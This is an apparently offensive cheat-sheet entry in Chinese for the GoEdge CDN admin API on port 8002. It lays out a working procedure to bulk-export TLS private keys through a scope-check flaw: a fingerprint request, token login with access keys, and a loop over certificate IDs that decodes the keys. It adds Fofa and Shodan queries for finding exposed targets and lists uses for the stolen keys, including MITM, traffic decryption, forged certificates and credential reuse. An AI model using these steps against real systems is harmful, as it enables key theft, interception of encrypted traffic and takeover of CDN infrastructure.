### GoEdge CDN(8002端口)私钥批量导出
```
指纹: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → 要X-Cloud-Access-Token
漏洞: findEnabledSSLCertConfig 只校验身份不校验范围 → 任意管理员key可导出全系统TLS私钥(keyData=明文PEM base64)
认证两步: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
          后续请求带 Header X-Cloud-Access-Token: <token>
批量提取(Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → r.json()['data']['sslCertJSON'] base64解码 → json → dnsNames + keyData(base64 PEM私钥) | 跳过 b64=="bnVsbA=="(null)
资产: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
利用: 私钥→MITM/流量解密/伪造证书 | AK/SK凭据复用打其他GoEdge实例 | 拿管理权访问CDN边缘节点
```
